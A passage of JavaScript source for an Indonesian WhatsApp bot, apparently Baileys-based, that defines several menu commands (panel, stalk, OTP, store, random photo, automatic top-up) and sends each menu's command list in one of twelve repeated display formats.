                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break 
case 'panelmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *P A N E L - M E N U*
${simboltengah}
${global.tTeks}panel
${global.tTeks}addusr
${global.tTeks}addsrv
${global.tTeks}admin
${global.tTeks}delusr
${global.tTeks}delsrv
${global.tTeks}detusr
${global.tTeks}listadmin
${global.tTeks}listusr
${global.tTeks}listsrv
${global.tTeks}reinstall
${global.tTeks}restartsrv
${global.tTeks}ramlist
${global.tTeks}spanel
${global.tTeks}startsrv
${global.tTeks}stopsrv
${global.tTeks}suspend
${global.tTeks}tutorial
${global.tTeks}unsuspend 
${global.tTeks}updatesrv
${global.tTeks}webpanel
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'stalkmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *S T A L K - M E N U*
${simboltengah}
${global.tTeks}animestalk *anime*
${global.tTeks}codstalk *id*
${global.tTeks}stalktiktok *users*
${global.tTeks}ghstalk *users*
${global.tTeks}githubrepo *repo*
${global.tTeks}ipstalk *ip*
${global.tTeks}itunes *query*
${global.tTeks}mlstalk *id*
${global.tTeks}npmstalk *users*
${global.tTeks}npmjs *query*
${global.tTeks}pbstalk *users*
${global.tTeks}twstalk *users*
${global.tTeks}telegramstalk *username*
${global.tTeks}igstalk *users*
${global.tTeks}ffstalk *id*
${global.tTeks}enka *id*
${global.tTeks}genshin *name*
${global.tTeks}genshinchar *name*
${global.tTeks}ytchanel *query*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'otpmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *O T P - M E N U*
${simboltengah}
${global.tTeks}layanan
${global.tTeks}order
${global.tTeks}getorder
${global.tTeks}profile
${global.tTeks}neednokos
${global.tTeks}wanumber
${global.tTeks}nowa
${global.tTeks}nokoswa
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break

case 'storemenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *S T O R E - M E N U*
${simboltengah}
${global.tTeks}batal
${global.tTeks}done
${global.tTeks}listpanel
${global.tTeks}listvps
${global.tTeks}proses
${global.tTeks}payment
${global.tTeks}reqpanel
${global.tTeks}reqvps
${global.tTeks}sewa
${global.tTeks}sewabot
${global.tTeks}sdomain
${global.tTeks}spanel
${global.tTeks}svps
${global.tTeks}sosmed
${global.tTeks}tunda
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'randomphoto': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *R A N D O M - P H O T O*
${simboltengah}
${global.tTeks}aesthetic *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}coffee *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cople *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}wallpaperanime *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}art *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}bts *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}woof *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}meow *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}lizard *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cosplay *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}hacker *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cyber *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}gamewallpaper *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}islamic *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}jennie *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}jiso *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}justina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cartoon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}pentol *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kucing *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}kpop *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}exo *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}lisa *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}spacee *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}car *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}technology *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}bike *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}shortquote *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}antiwork *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hacking *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}boneka *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}rose *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ryujin *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ulzzangboy *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ulzzanggirl *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}wallml *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}wallphone *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}mountain *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}goose *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}profilepic *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}couplepic *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}programming *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}pubg *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}blackpink *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}randomboy *ғʀᴇᴇ ᴏɴʟʏ*  
${global.tTeks}randomgirl *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hijab *ғʀᴇᴇ ᴏɴʟʏ*  
${global.tTeks}chinese *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}indo *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}japanese *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}korean *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}malay *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}thai *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}vietnamese *ғʀᴇᴇ ᴏɴʟʏ*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'otomatismenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *O T O M A T I S - M E N U*
${simboltengah}
${global.tTeks}acc/addsaldo
${global.tTeks}bukti
${global.tTeks}checktopup
${global.tTeks}deposit
${global.tTeks}minsaldo
${global.tTeks}saldo
${global.tTeks}dana
${global.tTeks}gopay
${global.tTeks}qris
${global.tTeks}topup
${global.tTeks}transfer *nomor nominal*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
